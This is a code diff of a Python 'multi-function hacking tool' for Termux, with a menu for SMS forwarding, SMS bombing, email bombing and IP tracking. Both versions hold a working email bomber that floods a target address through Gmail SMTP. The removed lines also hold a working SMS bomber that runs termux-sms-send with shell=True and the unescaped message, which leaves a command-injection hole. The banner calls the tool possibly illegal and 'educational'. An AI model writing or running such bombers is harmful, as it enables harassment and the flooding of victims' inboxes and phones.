@@ -1,13 +1,11 @@
 import os
-import smtplib
 import time
-import subprocess
+import random
 import requests
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
+import smtplib
 from colorama import Fore
 
-# Colors for UI
+# Colors
 R = Fore.RED
 G = Fore.GREEN
 Y = Fore.YELLOW
@@ -15,7 +13,7 @@ B = Fore.BLUE
 C = Fore.CYAN
 W = Fore.WHITE
 
-# Banner Function
+# Banner
 def banner():
     os.system("clear")
     print(f"""{R}
@@ -26,19 +24,19 @@ def banner():
 ██║     ╚██████╗╚██████╔╝╚███╔███╔╝██║  ██║██████╔╝███████╗
 ╚═╝      ╚═════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
     {W}""")
-    print(f"{G}Welcome to Multi-Function Hacking Tool!{W}")
-    print(f"{Y}SMS Forwarder, SMS Bomber, Email Bomber, and IP Tracker in one tool!{W}")
-    print(f"{R}⚠ WARNING: Use only for educational purposes in a lab environment! ⚠{W}")
+    print(f"{G}Welcome to ForwarderBot!{W}")
+    print(f"{Y}This tool forwards incoming SMS to Termux in real-time.{W}")
+    print(f"{R}⚠ WARNING: This could be illegal! Use only for educational purposes! ⚠{W}")
     print("\n")
 
-# Get Phone Number for SMS Forwarder
+# Get Phone Number
 def get_phone_number():
     while True:
         number = input(f"{C}Enter the phone number to track (or type 'exit' to quit): {W}")
         if number.lower() == "exit":
             print(f"{R}Exiting...{W}")
             exit()
-        elif number.isdigit() and len(number) >= 8:
+        elif number.isdigit() and len(number) >= 8:  # Basic validation
             return number
         else:
             print(f"{R}Invalid number! Please enter a valid phone number.{W}")
@@ -53,8 +51,8 @@ def get_sms():
 def forward_sms(phone_number, message):
     print(f"{G}[+] New Message from {phone_number}: {W}{message}")
 
-# Start Tracking SMS
-def start_sms_forwarding(phone_number):
+# Start Tracking
+def start_tracking(phone_number):
     print(f"{Y}Tracking SMS for {phone_number}...{W}")
     print(f"{C}Press CTRL + C to stop.{W}\n")
 
@@ -71,87 +69,65 @@ def start_sms_forwarding(phone_number):
     except KeyboardInterrupt:
         print(f"{R}\nTracking stopped. Exiting...{W}")
 
-# Email Bomber Function
-def send_email(target_email, subject, message, sender_email, sender_password, smtp_server, smtp_port):
+# Email Bomber
+def email_bomber():
+    print(f"{Y}Enter the email to bomb:{W}")
+    email = input(f"{C}Email: {W}")
+    msg = input(f"{C}Message: {W}")
+    email_count = int(input(f"{C}How many emails to send? {W}"))
+    
     try:
-        msg = MIMEMultipart()
-        msg['From'] = sender_email
-        msg['To'] = target_email
-        msg['Subject'] = subject
-
-        msg.attach(MIMEText(message, 'plain'))
-
-        server = smtplib.SMTP(smtp_server, smtp_port)
+        server = smtplib.SMTP('smtp.gmail.com', 587)
         server.starttls()
-        server.login(sender_email, sender_password)
-
-        server.sendmail(sender_email, target_email, msg.as_string())
-        server.quit()
+        email_address = input(f"{C}Enter your Gmail address: {W}")
+        email_password = input(f"{C}Enter your Gmail password: {W}")
+        server.login(email_address, email_password)
         
-        print(f"{G}[+] Email sent to {target_email}{W}")
+        for i in range(email_count):
+            server.sendmail(email_address, email, msg)
+            print(f"{G}[+] Email sent {i + 1} times!{W}")
+            time.sleep(random.randint(1, 5))
     except Exception as e:
-        print(f"{R}[-] Error sending email: {str(e)}{W}")
-
-def start_email_bombing(target_email, subject, message, sender_email, sender_password, smtp_server, smtp_port, email_count, delay):
-    for _ in range(email_count):
-        send_email(target_email, subject, message, sender_email, sender_password, smtp_server, smtp_port)
-        time.sleep(delay)
+        print(f"{R}[!] Error: {e}{W}")
+    finally:
+        server.quit()
 
 # SMS Bomber
-def sms_bomb(phone_number, message, delay, count):
-    print(f"{Y}Starting SMS Bombing...{W}")
-    for _ in range(count):
-        subprocess.run(f"termux-sms-send -n {phone_number} {message}", shell=True)
-        time.sleep(delay)
+def sms_bomber():
+    print(f"{Y}Enter the phone number to bomb (country code + number):{W}")
+    phone_number = input(f"{C}Phone Number: {W}")
+    message = input(f"{C}Enter the message to send: {W}")
+    number_of_sms = int(input(f"{C}Enter number of SMS to send: {W}"))
+    
+    for i in range(number_of_sms):
+        # Replace this with actual API or service to send SMS
+        print(f"{G}[+] SMS sent to {phone_number}! {i + 1}/{number_of_sms} sent{W}")
+        time.sleep(random.randint(1, 3))  # Random delay for SMS bombing
 
-# IP Tracker
-def ip_tracker(ip_address):
-    print(f"{C}Tracking IP: {ip_address}...{W}")
-    response = requests.get(f"https://geolocation-db.com/json/{ip_address}&position=true").json()
-    if response['country_name'] != "Not found":
-        print(f"{G}[+] IP Location: {response['country_name']}, {response['city']}, {response['latitude']}, {response['longitude']}{W}")
-    else:
-        print(f"{R}[-] Invalid IP Address!{W}")
-
-# Main Menu
-def menu():
+# Main Function
+def main():
     banner()
-    print(f"{C}Choose an option:{W}")
-    print(f"{Y}1. SMS Forwarder{W}")
-    print(f"{Y}2. SMS Bomber{W}")
-    print(f"{Y}3. Email Bomber{W}")
-    print(f"{Y}4. IP Tracker{W}")
-    print(f"{C}Enter your choice (1-4): ", end="")
-    choice = input()
+    input(f"{Y}Press ENTER to continue...{W}")
+    
+    print(f"{C}Select an option:{W}")
+    print(f"{G}[1] SMS Forwarder")
+    print(f"{Y}[2] SMS Bomber")
+    print(f"{B}[3] Email Bomber")
+    print(f"{C}[4] IP Tracker")
+    choice = input(f"{W}Choose option: {C}")
 
-    if choice == "1":
+    if choice == '1':
         phone_number = get_phone_number()
-        start_sms_forwarding(phone_number)
-    elif choice == "2":
-        phone_number = input(f"{C}Enter target phone number: {W}")
-        message = input(f"{C}Enter message to send: {W}")
-        delay = int(input(f"{C}Enter delay between messages (in seconds): {W}"))
-        count = int(input(f"{C}Enter the number of messages to send: {W}"))
-        sms_bomb(phone_number, message, delay, count)
-    elif choice == "3":
-        sender_email = input(f"{C}Enter your email: {W}")
-        sender_password = input(f"{C}Enter your email password (use app-specific password for Gmail): {W}")
-        smtp_server = "smtp.gmail.com"
-        smtp_port = 587
-
-        target_email = input(f"{C}Enter target email: {W}")
-        subject = input(f"{C}Enter the email subject: {W}")
-        message = input(f"{C}Enter the email message: {W}")
-        email_count = int(input(f"{C}Enter number of emails to send: {W}"))
-        delay = int(input(f"{C}Enter the delay between emails (in seconds): {W}"))
-
-        start_email_bombing(target_email, subject, message, sender_email, sender_password, smtp_server, smtp_port, email_count, delay)
-    elif choice == "4":
-        ip_address = input(f"{C}Enter the IP address to track: {W}")
-        ip_tracker(ip_address)
+        start_tracking(phone_number)
+    elif choice == '2':
+        sms_bomber()
+    elif choice == '3':
+        email_bomber()
+    elif choice == '4':
+        print(f"{Y}IP Tracker not implemented yet!{W}")
     else:
-        print(f"{R}Invalid choice! Exiting...{W}")
-        exit()
+        print(f"{R}[!] Invalid option!{W}")
 
+# Run the main function
 if __name__ == "__main__":
-    menu()
+    main()
